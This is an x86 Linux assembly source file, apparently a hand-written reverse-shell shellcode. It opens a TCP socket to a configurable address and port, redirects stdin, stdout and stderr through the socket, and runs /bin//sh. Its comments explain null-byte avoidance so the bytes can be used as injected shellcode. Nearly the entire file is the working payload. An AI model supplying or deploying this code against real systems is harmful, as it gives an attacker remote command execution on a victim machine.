; Port numbers and IP addresses are made to be as simple to change as possible
; without adding too many extra instructions

; Compile to test or get opcodes with
; nasm -f elf32 socket_execve.asm
; ld -m elf_i386 socket_execve.o -o socket_execve

section .text
	global _start

_start:
	; Make room on the stack for shellcode to be untouched
	sub sp, 0x0202
	; Setup a stack frame
	mov ebp, esp
	sub sp, 0x0202

; Create the socket object (syscall 359)
	xor eax, eax
	mov ax, 359

	; clear upper bits of registers
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

	; domain: AF_INET for IPV4
	mov bl, 2

	; type: SOCK_STREAM for TCP
	mov cl, 1

	; protocol: TCP (can also be 0 since SOCK_STEAM is also used for TCP)
	mov dl, 6

	; socket syscall
	int 0x80

	; save the sockfd
	mov [ebp + 4], eax

; Create the sockaddr object
	
	; sin_family: AF_INET
	xor eax, eax
	mov al, 2
	mov word [ebp + 8], ax

	; sin_port: change this as needed (instructions needs to be different if port 255 or below to avoid null bytes)
	mov ax, 2468
	xchg ah, al
	mov word [ebp + 10], ax

	; sin_addr: uses 192.168.1.0 as an example but can be replaced as needed
	; use a mov <register>, 1 | dec <register> instruction if zero is needed to avoid null bytes
	
	mov al, 192
	mov ah, 168

	mov word [ebp + 12], ax

	mov al, 1
	mov ah, 1
	dec ah
	
	mov word [ebp + 14], ax

; Connect the socket
	
	; Connect syscall number (362)
	mov ax, 362

	; sockfd
	mov ebx, [ebp + 4]

	; sockaddr_in struct
	lea ecx, [ebp + 8]

	; addrlen
	mov dl, 16

	; connect syscall
	int 0x80

; Copy stdin/out/error fds to sockfd so execve io goes through the socket
	
	; Setup registers
	xor eax, eax
	xor ecx, ecx

	; dup2 syscall number (63)
	mov al, 63

	; oldfd
	mov bl, byte [ebp + 4]
	; newfd
	mov cl, 1
	dec cl

	; stdin
	int 0x80

	; stdout
	xor eax, eax
	mov al, 63
	mov cl, 1
	int 0x80

	; stderror
	xor eax, eax
	mov al, 63
	mov cl, 2
	int 0x80

; Execve
	; execve syscall number (11)
    mov al, 11

    ; env
    xor edx, edx

    ; argv
    xor ecx, ecx

    ;filename
    push ecx
    mov ebx, 0x68732f2f
    push ebx
    mov ebx, 0x6e69622f
    push ebx
    lea ebx, [esp]

    ; execve syscall
    int 0x80

